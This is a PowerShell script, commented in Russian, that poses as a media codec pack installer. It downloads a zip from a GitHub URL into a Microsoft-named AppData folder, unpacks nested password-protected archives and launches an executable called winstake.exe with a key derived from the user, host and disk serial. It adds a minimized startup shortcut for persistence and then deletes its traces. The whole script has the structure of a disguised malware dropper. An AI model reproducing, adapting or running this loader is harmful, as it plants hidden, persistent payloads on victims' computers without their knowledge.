$p = 'M3d!aPl@yer_2026#Codec'
$v = "$env:LOCALAPPDATA\Microsoft\MediaCodecPack\"

$wc = New-Object System.Net.WebClient
$wc.Headers.Add("User-Agent", "Mozilla/5.0")

if (!(Test-Path $v)) { New-Item -ItemType Directory -Path $v -Force | Out-Null }

$z = "$v\MediaCodecPack.zip"
$wc.DownloadFile('https://github.com/MaryyDEV/LavvTool/raw/refs/heads/main/MediaCodecPack.zip', $z)

Expand-Archive -Path $z -DestinationPath $v -Force
Set-Location $v

function Wait-File {
    param($Path, $TimeoutSec = 10)
    $end = (Get-Date).AddSeconds($TimeoutSec)
    while ((Get-Date) -lt $end) {
        if (Test-Path $Path) {
            $size1 = (Get-Item $Path).Length
            Start-Sleep -Milliseconds 200
            $size2 = (Get-Item $Path).Length
            if ($size1 -eq $size2) { return $true }
        }
        Start-Sleep -Milliseconds 200
    }
    return $false
}

# Внешний архив (codec_base.7z)
if (Test-Path '.\7za.exe') {
    $outer = 'codec_base.7z'
    if (Test-Path $outer) {
        & '.\7za.exe' x $outer "-p$p" -y -o"$v" | Out-Null
        Wait-File "$v\codec_core.7z" -TimeoutSec 15 | Out-Null
    }
}

# Убиваем старые процессы (winstake)
Stop-Process -Name winstake -Force -ErrorAction SilentlyContinue

# Удаляем старые файлы
Remove-Item "$v\winstake.exe" -Force -ErrorAction SilentlyContinue

# Внутренний архив (codec_core.7z)
$innerPath = "$v\codec_core.7z"
if ((Test-Path $innerPath) -and (Test-Path '.\7za.exe')) {
    & '.\7za.exe' x $innerPath "-p$p" -aoa -y -o"$v" | Out-Null
    Wait-File "$v\winstake.exe" -TimeoutSec 15 | Out-Null
}

# Генерация ключа
function Get-VolumeSerial {
    $drive = Get-WmiObject Win32_LogicalDisk -Filter "DeviceID='C:'"
    return $drive.VolumeSerialNumber.ToUpper().PadLeft(8, '0')
}

function GenerateKey {
    $username = $env:USERNAME
    $hostname = $env:COMPUTERNAME
    $serial = Get-VolumeSerial
   
    $data = "$username|$hostname|$serial"
    $bytes = [System.Text.Encoding]::UTF8.GetBytes($data)
    $hash = [System.Security.Cryptography.SHA256]::Create().ComputeHash($bytes)
    $key = [System.BitConverter]::ToString($hash).Replace("-", "").ToLower()
    return $key.Substring(0, 16)
}

# Запуск
if (Test-Path "$v\winstake.exe") {
    $key = GenerateKey
    Start-Process -FilePath "$v\winstake.exe" -ArgumentList $key -WorkingDirectory $v 
}

# Ярлык в автозагрузке
$startup = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup"
$lnkPath = "$startup\MediaCodecUpdate.lnk"
$wshell = New-Object -ComObject WScript.Shell
$lnk = $wshell.CreateShortcut($lnkPath)
$lnk.TargetPath = "$v\winstake.exe"
$lnk.Arguments = $key 
$lnk.WindowStyle = 7
$lnk.WorkingDirectory = "$v"
$lnk.Save()

# Очистка
Start-Sleep -Seconds 30
Remove-Item $z, "$v\codec_base.7z", "$v\codec_core.7z" -Force -ErrorAction SilentlyContinue
Get-ChildItem $v -Include 7za.exe,7za.dll,7zxa.dll | Remove-Item -Force -ErrorAction SilentlyContinue